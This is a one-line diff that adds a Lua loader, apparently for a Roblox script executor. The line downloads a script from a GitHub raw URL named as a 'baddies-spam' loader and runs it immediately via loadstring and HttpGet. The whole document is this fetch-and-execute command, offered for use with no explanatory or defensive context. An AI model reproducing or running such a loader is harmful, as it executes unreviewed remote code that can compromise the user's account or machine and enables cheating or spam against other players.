@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/baddies-spam6-t50ay5fohxt1j1.lua"))()
